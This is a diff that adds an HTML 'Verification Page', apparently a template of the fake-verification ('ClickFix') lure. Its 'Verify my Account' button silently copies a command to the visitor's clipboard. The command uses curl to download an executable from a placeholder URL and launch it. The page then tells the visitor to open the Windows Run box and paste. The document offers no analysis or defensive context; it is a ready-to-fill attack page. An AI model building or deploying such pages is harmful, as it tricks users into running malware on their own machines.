@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Page</title>
+</head>
+<body>
+
+    <h1>Verification Page</h1>
+    <p>Please verify your account by performing the following actions:</p>
+    <p>1. Click <b>Verify my Account button</b> below</p>
+    <button onclick="copyToClipboard()" style="height:50px;width:200px">Verify my Account</button>
+    <p>2. Press & hold <b>Windows Key + R</b></p>
+    <p>3. In the new window, press <b>CTRL + V</b></p>
+
+    <script>
+        function copyToClipboard() {
+            var text = "curl -o https://thisIsAnInvalidTestWebsiteModifyThisURL/test.exe -o test.exe && start test.exe";
+
+            var textarea = document.createElement("textarea");
+            textarea.value = text;
+            document.body.appendChild(textarea);
+
+            textarea.select();
+            textarea.setSelectionRange(0, 99999); // For mobile compatibility
+
+            var successful = document.execCommand("copy");
+
+		document.body.removeChild(textarea);
+
+        }
+    </script>
+</body>
+</html>
